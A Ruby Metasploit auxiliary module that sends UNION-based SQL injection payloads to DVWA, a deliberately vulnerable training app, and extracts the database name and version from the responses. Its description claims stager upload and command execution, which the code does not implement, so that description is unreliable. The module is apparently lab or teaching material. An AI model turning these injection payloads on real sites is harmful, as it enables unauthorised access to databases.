require 'rex/proto/http'
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	def initialize
		super(
			'Name'        => 'DVWA SQL Injection to Command Execution',
			'Description' => 'Exploits SQL Injection Bug to Upload Stager and Execute Arbitrary Commands on the Target',
			'Author'      => 'Nipun_Jaswal',
			'License'     => MSF_LICENSE)
			register_options(
			[
				OptString.new('DIRS', [ true,  "Directory Structure", '/vulnerabilities/sqli/'])
			], self.class)
	end
	def run_host(ip)
		begin
		#Finding The Database From Vulnerable SQL
		sqli1 = "-2%27%20UNION%20SELECT%20NULL%2Cdatabase%28%29--+&Submit=Submit"  
		dir_path = datastore['DIRS']
		res = send_request_raw({
			'method'    => 'GET',
			'uri'       => "#{dir_path}index.php?id=#{sqli1}",
			'cookie'    => "adminer_version=0; PHPSESSID=h51ua727rtj2193ghn69s51ec5; security=low"
					})
		resp1= cleaner(res)
		print_line("#{resp1}")

		#Finding The Database From Vulnerable SQL
		sqli2 = "-2%27%20UNION%20SELECT%20NULL%2Cversion%28%29--+&Submit=Submit"  
		res2 = send_request_raw({
			'method'    => 'GET',
			'uri'       => "#{dir_path}index.php?id=#{sqli2}",
			'cookie'    => "adminer_version=0; PHPSESSID=h51ua727rtj2193ghn69s51ec5; security=low"
					})
		resp2= cleaner(res2)
		print_line("#{resp2}")					   
		end
	end
	
# SQLi Data Finder Module
	def cleaner(res)
		find1= (res.body =~ /Surname:/)
		find2= (res.body =~ /<\/pre>/)
		find1=find1+9
		len= find2-find1
		data=res.body[find1,len]
		return data
	end

end

